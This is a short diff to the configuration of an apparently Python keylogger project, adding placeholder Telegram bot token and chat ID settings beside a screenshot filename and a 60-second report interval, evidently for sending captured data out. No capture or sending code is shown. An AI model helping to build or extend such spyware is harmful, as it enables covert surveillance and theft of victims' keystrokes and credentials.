@@ -40,3 +40,7 @@ screenshot_information = "screenshot.png"
 file_path = "C:\\Users\\User\\PycharmProjects\\KeyLogger\\venv"
 extend = "\\"
 SEND_REPORT_EVERY = 60
+
+# Telegram settings
+telegram_token = 'your_telegram_bot_token'  # Replace with your token
+telegram_chat_id = 'your_chat_id'  # Replace with your chat ID
